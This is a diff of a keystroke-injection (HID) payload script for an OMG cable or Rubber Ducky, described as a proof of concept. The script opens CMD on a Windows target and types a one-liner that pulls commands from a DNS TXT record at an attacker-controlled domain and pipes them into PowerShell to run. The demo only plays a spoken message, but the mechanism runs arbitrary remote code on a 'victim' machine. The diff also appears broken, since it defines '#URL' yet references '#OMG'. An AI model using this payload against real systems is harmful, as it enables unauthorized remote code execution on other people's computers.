@@ -1,14 +1,15 @@
-#-----------------------------------------------------------------------------------------------------------
+REM_BLOCK
 # Title:        Use a DNS TXT record to get the commands you want to execute instead of typing them in 
 # Description:  An example of how you could use DNS TXT records to get the powershell code you want to run.
 #               This POC will get some commands that will play a message on a victims computer using Windows
-#               build speach engine. It also turns up the volume first, then speak out loud the text you want.               
+#               build speach engine. It also turns up the volume first, then speak out loud the text you want.
 # Author:       Keld Norman / Twitter: @keld_norman
 # Props:        Google, RTFM, and trial and errors
 # Version:      1.0
 # Category:     Execution
 # Target:       Windows10+ Powershell
 # Attackmodes:  HID
+
 #-----------------------------------------------------------------------------------------------------------
 # Quick Guide
 #-----------------------------------------------------------------------------------------------------------
@@ -37,12 +38,14 @@ for /f "tokens=* USEBACKQ" %a in (`nslookup "-q=txt" omg.yourdomain.com 2^>nul^|
 #-----------------------------------------------------------------------------------------------------------
 # In OMG code that would be: 
 #-----------------------------------------------------------------------------------------------------------
+END_REM
+
+DEFINE #URL omg.yourdomain.com
+
 DUCKY_LANG US
+DELAY 2000
 GUI r
 DELAY 1000
-STRING CMD
-ENTER
+STRINGLN CMD
 DELAY 500 
-STRING for /f "tokens=* USEBACKQ" %a in (`nslookup "-q=txt" omg.yourdomain.com 2^>nul^|find /I """"`) do @echo|set /p="%~a"|powershell -Command -
-ENTER
-#-----------------------------------------------------------------------------------------------------------
+STRINGLN for /f "tokens=* USEBACKQ" %a in (`nslookup "-q=txt" #OMG 2^>nul^|find /I """"`) do @echo|set /p="%~a"|powershell -Command -
